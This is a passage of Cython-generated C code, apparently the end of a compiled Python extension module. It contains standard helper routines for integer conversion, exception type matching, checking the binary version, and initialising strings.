#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */
